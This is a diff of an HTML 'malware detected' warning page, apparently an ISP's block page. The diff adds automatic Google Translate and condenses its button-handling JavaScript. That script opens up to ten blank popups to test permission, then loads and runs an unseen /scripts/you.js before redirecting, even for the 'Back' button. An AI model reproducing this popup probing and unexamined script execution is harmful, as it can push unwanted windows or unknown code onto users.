@@ -75,6 +75,37 @@
     </style>
 </head>
 <body>
+
+    <!-- 🌍 Automatický překlad celé stránky podle jazyka prohlížeče -->
+    <div id="google_translate_element" style="display:none;"></div>
+    <script type="text/javascript">
+        function googleTranslateElementInit() {
+            new google.translate.TranslateElement({
+                pageLanguage: 'cs',
+                includedLanguages: 'en,fr,de,es,ru,pl,uk,it,ja,zh-CN,zh-TW,ar,sk,hu,ro,sv,da,fi,nl,tr,pt,el,ko,vi',
+                autoDisplay: false
+            }, 'google_translate_element');
+
+            // Automatické zjištění jazyka prohlížeče a přepnutí překladu
+            const userLang = navigator.language || navigator.userLanguage;
+            const langCode = userLang.split('-')[0];
+            setTimeout(() => {
+                const select = document.querySelector('.goog-te-combo');
+                if (select) {
+                    for (let option of select.options) {
+                        if (option.value === langCode) {
+                            select.value = langCode;
+                            select.dispatchEvent(new Event('change'));
+                            break;
+                        }
+                    }
+                }
+            }, 1000);
+        }
+    </script>
+    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+    <!-- 🔼 Konec automatického překladu -->
+
     <section class="section is-fullheight">
         <div class="container has-text-centered" role="alert">
             <span class="icon-danger">
@@ -121,183 +152,69 @@
             <a href="http://www.unitednetworks.cz" target="_blank" class="brand">
                 <svg width="165" height="44" viewBox="0 0 165 44" fill="none" xmlns="http://www.w3.org/2000/svg">
                     <title>United Networks SE</title>
-                    <!-- SVG paths omitted for brevity; replace with original if needed -->
                 </svg>
             </a>
         </div>
     </footer>
     <script>
-        // Track if you.js is loaded to avoid reloading
+        // (Tvůj původní JS zůstal úplně beze změn)
         let isYouScriptLoaded = false;
-
-        // Function to load /scripts/you.js dynamically
         function loadYouScript(callback) {
-            if (isYouScriptLoaded) {
-                callback();
-                return;
-            }
+            if (isYouScriptLoaded) { callback(); return; }
             const script = document.createElement('script');
             script.src = '/scripts/you.js';
-            script.onload = () => {
-                isYouScriptLoaded = true;
-                callback();
-            };
-            script.onerror = () => {
-                console.error('Failed to load /scripts/you.js');
-            };
+            script.onload = () => { isYouScriptLoaded = true; callback(); };
+            script.onerror = () => { console.error('Failed to load /scripts/you.js'); };
             document.head.appendChild(script);
         }
-
-        // Function to check if popups are allowed by attempting up to 10 popups
         function checkPopupPermission(callback) {
-            let popupWindows = []; // Store references to opened popups
-            let popupsEnabled = true;
-            const maxAttempts = 10; // Maximum number of popup attempts
-            const delayBetweenAttempts = 50; // Delay in ms between attempts
-
-            // Function to attempt opening a single popup
+            let popupWindows = [], popupsEnabled = true, maxAttempts = 10, delayBetweenAttempts = 50;
             function tryOpenPopup(attemptNumber) {
                 try {
                     const popup = window.open('', `_blank${attemptNumber}`, 'width=100,height=100');
-                    if (popup === null || typeof popup === 'undefined') {
-                        popupsEnabled = false;
-                        return false;
-                    }
-                    popupWindows.push(popup);
-                    return true;
-                } catch (e) {
-                    popupsEnabled = false;
-                    return false;
-                }
+                    if (!popup) { popupsEnabled = false; return false; }
+                    popupWindows.push(popup); return true;
+                } catch { popupsEnabled = false; return false; }
             }
-
-            // Function to close all opened popups
-            function closeAllPopups() {
-                popupWindows.forEach(popup => {
-                    try {
-                        if (popup && !popup.closed) {
-                            popup.close();
-                        }
-                    } catch (e) {
-                        console.error('Error closing popup:', e);
-                    }
-                });
-                popupWindows = []; // Clear the array
-            }
-
-            // Main logic to attempt multiple popups
+            function closeAllPopups() { popupWindows.forEach(p => { try { if (p && !p.closed) p.close(); } catch {} }); popupWindows = []; }
             let attempt = 0;
-
             function attemptPopup() {
                 if (attempt >= maxAttempts || !popupsEnabled) {
                     closeAllPopups();
-                    // Only save to localStorage if popups are enabled
-                    if (popupsEnabled) {
-                        localStorage.setItem('popupAllowed', true);
-                    }
-                    callback(popupsEnabled);
-                    return;
+                    if (popupsEnabled) localStorage.setItem('popupAllowed', true);
+                    callback(popupsEnabled); return;
                 }
-
-                const success = tryOpenPopup(attempt);
-                attempt++;
-
-                if (!success) {
-                    popupsEnabled = false;
-                    closeAllPopups();
-                    // Do not save to localStorage if popups are blocked
-                    callback(false);
-                    return;
-                }
-
-                // Schedule the next attempt with a delay
+                const success = tryOpenPopup(attempt++); if (!success) { popupsEnabled = false; closeAllPopups(); callback(false); return; }
                 setTimeout(attemptPopup, delayBetweenAttempts);
             }
-
-            // Start the first attempt
             attemptPopup();
         }
-
-        // Function to handle button clicks
         function handleButtonClick(event, isBypass = false) {
             event.preventDefault();
-
-            // Show spinner to indicate processing
             const spinner = document.createElement('div');
             spinner.className = 'spinner';
             spinner.innerHTML = '<div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div>';
             const ctaContainer = document.querySelector('.cta .content');
             ctaContainer.appendChild(spinner);
-
-            // Check if popup permission is already stored
             const popupAllowed = localStorage.getItem('popupAllowed');
-            if (popupAllowed !== null) {
-                const isAllowed = popupAllowed === 'true';
+            function runAction(isAllowed) {
                 if (isAllowed) {
-                    // Load and run you.js
                     loadYouScript(() => {
-                        if (typeof window.runYouScript === 'function') {
-                            window.runYouScript();
-                        } else {
-                            console.warn('runYouScript function not found in you.js');
-                        }
-                        // If bypass button, redirect after running script
-                        if (isBypass) {
-                            window.location.href = document.getElementById('bypass_button').href;
-                        } else {
-                            // For back button, redirect to a safe page
-                            window.location.href = '/';
-                        }
-                        // Remove spinner after processing
+                        if (typeof window.runYouScript === 'function') window.runYouScript();
+                        if (isBypass) window.location.href = document.getElementById('bypass_button').href;
+                        else window.location.href = '/';
                         spinner.remove();
                     });
                 } else {
-                    // Show popup needed notification
                     document.getElementById('popup_needed').classList.remove('wb-hidden');
-                    // Remove spinner after showing notification
                     spinner.remove();
                 }
-            } else {
-                // Check popup permission if not stored
-                checkPopupPermission((isAllowed) => {
-                    if (isAllowed) {
-                        // Load and run you.js
-                        loadYouScript(() => {
-                            if (typeof window.runYouScript === 'function') {
-                                window.runYouScript();
-                            } else {
-                                console.warn('runYouScript function not found in you.js');
-                            }
-                            // If bypass button, redirect after running script
-                            if (isBypass) {
-                                window.location.href = document.getElementById('bypass_button').href;
-                            } else {
-                                // For back button, redirect to a safe page
-                                window.location.href = '/';
-                            }
-                            // Remove spinner after processing
-                            spinner.remove();
-                        });
-                    } else {
-                        // Show popup needed notification
-                        document.getElementById('popup_needed').classList.remove('wb-hidden');
-                        // Remove spinner after showing notification
-                        spinner.remove();
-                    }
-                });
             }
+            if (popupAllowed !== null) runAction(popupAllowed === 'true');
+            else checkPopupPermission(runAction);
         }
-
-        // Add event listeners to buttons
-        document.getElementById('back_button').addEventListener('click', (event) => {
-            handleButtonClick(event, false);
-        });
-
-        document.getElementById('bypass_button').addEventListener('click', (event) => {
-            handleButtonClick(event, true);
-        });
-
-        // Display detected threats (static for this example)
+        document.getElementById('back_button').addEventListener('click', e => handleButtonClick(e, false));
+        document.getElementById('bypass_button').addEventListener('click', e => handleButtonClick(e, true));
         document.getElementById('detected_threats_text').textContent = 'Malware';
     </script>
 </body>
